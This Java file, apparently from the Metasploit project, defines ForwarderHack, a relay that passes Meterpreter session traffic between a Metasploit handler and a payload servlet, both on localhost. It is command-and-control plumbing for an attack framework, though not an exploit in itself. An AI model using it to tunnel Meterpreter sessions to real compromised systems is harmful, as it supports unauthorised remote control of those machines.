package com.metasploit.meterpreter;

import java.io.*;
import java.net.*;

public class ForwarderHack {
	public static void main(String[] args) throws IOException {
		String msfUrl = "http://localhost:4114/";
		String payloadUrl = "http://localhost:8080/test/";

		// INITIAL HANDSHAKE //
		// pull msfUrl+INITJM, cut off the connID, and forward
		// the rest to the servlet, prepend session ID 0 to start
		// a new payload.
		System.out.println("Connect INITJM");
		URLConnection ucMSF = new URL(msfUrl+"INITJM").openConnection();
		ucMSF.setRequestProperty("Connection", "close");
		DataInputStream in = new DataInputStream(ucMSF.getInputStream());
		String connID = in.readUTF()+"/";
		System.out.println("Conn ID = "+connID);
		System.out.println("Connect Servlet");
		URLConnection ucServlet = new URL(payloadUrl).openConnection();
		ucServlet.setRequestProperty("Connection", "close");
		ucServlet.setDoOutput(true);
		DataOutputStream out = new DataOutputStream(ucServlet.getOutputStream());
		out.writeInt(0); // session id
		copyStream(in, out);

		while (true) {
			// load data from servlet and forward it to the msfUrl+connID
			in = new DataInputStream(ucServlet.getInputStream());
			int sessionId = in.readInt();
			System.out.println("Session ID = "+sessionId);
			System.out.println("Connect MSF");
			ucMSF = new URL(msfUrl+connID).openConnection();
			ucMSF.setRequestProperty("Connection", "close");
			ucMSF.setDoOutput(true);
			out = new DataOutputStream(ucMSF.getOutputStream());
			copyStream(in, out);

			// load response from msfUrl and forward it to the servlet
			in = new DataInputStream(ucMSF.getInputStream());
			System.out.println("Connect Servlet");
			ucServlet = new URL(payloadUrl).openConnection();
			ucServlet.setRequestProperty("Connection", "close");
			ucServlet.setDoOutput(true);
			out = new DataOutputStream(ucServlet.getOutputStream());
			out.writeInt(sessionId);
			copyStream(in, out);
		}
	}

	private static void copyStream(InputStream in, OutputStream out) throws IOException {
		System.out.println("Transfer data");
		byte[] buf = new byte[4096];
		int len;
		while((len = in.read(buf)) != -1) {
			out.write(buf,0,len);
		}
		out.flush();
		out.close();
		in.close();
		System.out.println("Transfer data done");
	}
}
